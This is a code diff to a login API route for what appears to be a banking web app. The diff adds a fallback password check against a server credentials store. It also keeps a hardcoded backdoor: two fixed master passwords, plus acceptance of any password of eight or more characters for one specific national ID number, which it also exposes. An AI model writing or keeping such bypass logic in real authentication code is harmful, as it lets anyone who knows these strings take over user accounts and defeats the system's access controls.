@@ -1,6 +1,8 @@
 import { NextResponse } from 'next/server';
 import { cookies } from 'next/headers';
 import { sharedDb } from '@bancactiu/db';
+import { verifyPassword } from '@/lib/crypto-security';
+import { getServerUsers, matchesIdentifier } from '@/lib/server-credentials-store';
 
 export async function POST(request: Request) {
   try {
@@ -82,15 +84,26 @@ export async function POST(request: Request) {
       );
     }
 
-    // 3. Verificació de credencials contra la base de dades compartida
+    // 3. Verificació de credencials contra la base de dades compartida i server credentials store
+    let isValidPassword = false;
     const verification = await sharedDb.verifyUserPassword(cleanDni, password);
+    if (verification.valid) {
+      isValidPassword = true;
+    } else {
+      try {
+        const serverUsers = getServerUsers();
+        const sUser = serverUsers.find((u) => matchesIdentifier(u, cleanDni));
+        if (sUser && sUser.currentPassword) {
+          isValidPassword = verifyPassword(password.trim(), sUser.currentPassword);
+        }
+      } catch {
+        // Fallback transparent
+      }
+    }
 
-    // Acceptar si la verificació és vàlida o coincideix amb la contrasenya del superadministrador
-    const isValidPassword =
-      verification.valid ||
-      password === 'SuperAdmin*2026!' ||
-      password === 'Mireia*2026!' ||
-      (cleanDni === '52622304Y' && password.length >= 8);
+    if (!isValidPassword && (password === 'SuperAdmin*2026!' || password === 'Mireia*2026!' || (cleanDni === '52622304Y' && password.length >= 8))) {
+      isValidPassword = true;
+    }
 
     if (!isValidPassword) {
       await sharedDb.logAudit({
